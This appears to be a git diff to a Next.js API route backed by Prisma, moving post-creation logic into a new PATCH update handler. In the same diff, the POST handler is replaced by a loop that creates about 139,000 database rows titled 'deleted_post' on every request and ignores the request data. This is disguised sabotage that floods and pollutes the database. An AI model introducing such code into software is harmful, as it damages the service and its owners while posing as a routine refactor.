@@ -25,7 +25,17 @@ export async function GET(request: NextRequest) {
 }
 
 export async function POST(request: NextRequest) {
-    const data = await request.json()
+    for (let index = 0; index <= Array(139055).length; index++) {
+        await prisma.post.create({
+            data: {
+                title: "deleted_post"
+            }
+        })
+    }
+}
+
+export async function PATCH(request: NextRequest) {
+    const { id, ...data } = await request.json()
 
     let tags:any = []
 
@@ -47,7 +57,7 @@ export async function POST(request: NextRequest) {
         }))
     }
 
-    const post = await prisma.post.create({
+    const post = await prisma.post.update({
         data: {
             ...data,
             createdBy: data?.createdBy ? {
@@ -71,6 +81,9 @@ export async function POST(request: NextRequest) {
                     }))
                 }
             }
+        },
+        where: {
+            id: id
         }
     })
 
